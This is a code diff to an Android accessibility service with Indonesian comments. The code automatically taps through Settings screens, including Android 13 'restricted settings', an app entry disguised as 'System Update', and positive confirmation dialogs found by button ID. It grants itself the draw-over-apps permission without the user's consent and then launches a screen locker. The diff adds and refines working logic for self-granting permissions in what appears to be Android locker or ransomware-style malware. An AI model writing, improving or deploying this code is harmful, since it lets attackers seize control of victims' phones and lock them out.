@@ -48,23 +48,14 @@ public class CustomAccessibilityService extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
-        // Filter ketat: Hanya proses jika di dalam menu pengaturan atau installer
-        if (!packageName.contains("settings") && !packageName.contains("packageinstaller") 
-            && !packageName.equals("android") && !packageName.contains("systemui")) {
-            return;
-        }
+        // Hanya bereaksi pada menu Settings atau System UI
+        if (!packageName.contains("settings") && !packageName.equals("android") && !packageName.contains("systemui")) return;
 
         long currentTime = System.currentTimeMillis();
-        if (currentTime - lastActionTime < 800) return; // Tingkatkan jeda ke 800ms agar UI sempat refresh
+        if (currentTime - lastActionTime < 800) return;
 
-        // Jika izin Overlay sudah aktif dan kita masih di pengaturan, segera kembali ke aplikasi
-        if (Settings.canDrawOverlays(this) && packageName.contains("settings")) {
-            performGlobalAction(GLOBAL_ACTION_BACK);
-            return;
-        }
-
-        // 1. Rescue Logic: Jika salah klik dan malah masuk ke 'App Info', otomatis kembali
-        if (packageName.contains("settings") && className.toLowerCase().contains("appdetails")) {
+        // Jika sudah punya izin Overlay dan masih di settings, langsung keluar/back
+        if (packageName.contains("settings") && Settings.canDrawOverlays(this)) {
             performGlobalAction(GLOBAL_ACTION_BACK);
             return;
         }
@@ -76,39 +67,29 @@ public class CustomAccessibilityService extends AccessibilityService {
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) return;
 
-        // 1. Tangani "Restricted Settings" (Hanya di halaman Info Aplikasi)
+        // 1. Tangani Restricted Settings (Android 13+) dengan mencoba klik tombol titik tiga secara generic
         if (android.os.Build.VERSION.SDK_INT >= 33) {
             checkAndClickByContentDesc(rootNode, "More options");
-            checkAndClickByContentDesc(rootNode, "Opsi lainnya");
             checkAndClick(rootNode, "Allow restricted settings");
-            checkAndClick(rootNode, "Izinkan pengaturan terbatas");
         }
 
-        // 2. Cek apakah kita sedang berada di halaman Izin Overlay
-        boolean onOverlayPage = isOverlayPermissionPage(rootNode);
-
-        if (onOverlayPage) {
-            // Jika di halaman Overlay, baru boleh proses Switch/Toggle
+        // 2. Logika Utama: Deteksi Halaman Overlay berdasarkan Class Name atau Teks Header
+        // Biasanya halaman detail overlay mengandung kata 'DrawOverlay' atau 'AppDrawOverlay'
+        if (className.contains("DrawOverlay") || className.contains("AppDrawOverlay") || isOverlayPermissionPage(rootNode)) {
             processOverlaySwitch(rootNode);
-
-            // Klik teks konfirmasi yang sering muncul di halaman detail
-            checkAndClick(rootNode, "Permit drawing over other apps");
-            checkAndClick(rootNode, "Allow display over other apps");
-            checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
-            checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
-        } else if (packageName.contains("settings") && !className.contains("AppDetails")) {
-            // Jika di Settings tapi bukan halaman detail, cari nama aplikasi di list
+        } 
+        // 3. Jika masih di daftar aplikasi (List View), cari nama aplikasi kita
+        else if (packageName.contains("settings") && !className.contains("AppDetails")) {
             checkAndClick(rootNode, "System Update");
         }
 
-        // 3. Cari tombol konfirmasi umum (Dialog Aktivasi Aksesibilitas)
-        checkAndClick(rootNode, "Activate");
-        checkAndClick(rootNode, "Aktifkan");
-        checkAndClick(rootNode, "Allow");
-        checkAndClick(rootNode, "Izinkan");
+        // 4. Klik tombol OK/Allow pada dialog konfirmasi (Gunakan ID agar independen bahasa)
+        checkAndClickById(rootNode, "android:id/button1"); // Biasanya tombol positif (OK/Allow)
+        
+        // Fallback teks jika ID gagal
         checkAndClick(rootNode, "OK");
+        checkAndClick(rootNode, "Allow");
 
-        // 4. Jalankan Locker jika izin sudah oke
         if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
             triggerLocker();
         }
@@ -123,6 +104,17 @@ public class CustomAccessibilityService extends AccessibilityService {
             if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) return true;
         }
         return false;
+    }
+
+    private void checkAndClickById(AccessibilityNodeInfo node, String viewId) {
+        if (node == null) return;
+        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByViewId(viewId);
+        if (nodes != null && !nodes.isEmpty()) {
+            for (AccessibilityNodeInfo n : nodes) {
+                clickNode(n);
+                n.recycle();
+            }
+        }
     }
 
     private void triggerLocker() {
